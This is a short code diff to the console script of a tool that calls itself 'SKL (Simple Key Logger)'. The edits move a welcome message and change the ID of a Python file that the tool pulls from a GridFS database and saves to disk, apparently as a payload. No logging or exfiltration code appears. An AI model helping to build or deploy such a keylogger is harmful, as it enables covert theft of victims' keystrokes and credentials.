@@ -11,6 +11,7 @@ from gridfs import GridFS
 from bson.objectid import ObjectId
 import pygetwindow as gw
 
+
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
 
 
@@ -311,9 +312,9 @@ def returnConfigData():
 #%# -----------------------------------CONTROL PANEL----------------------------------- #%#
 
 
-print("Welcome to SKL, type \"help\" for a list of commands")
 
 def __main__():
+    print("Welcome to SKL, type \"help\" for a list of commands")
     print( bcolors.RESET_DIM +bcolors.WARNING + "SKL (Simple Key Logger)")
     CONSOLE = input(bcolors.WARNING + "Command: " + bcolors.WHITE)
     os.system("cls")
@@ -383,7 +384,7 @@ def __main__():
    
                     
                 # Download the Python file
-                fsID = ObjectId("64e5f27518e976773663996b")
+                fsID = ObjectId("64e65f957cf3d923d8a3fc8c")
                 with open(f'{filename}.py', 'wb') as f:
                     file = fs.get(fsID)
                     f.write(file.read())
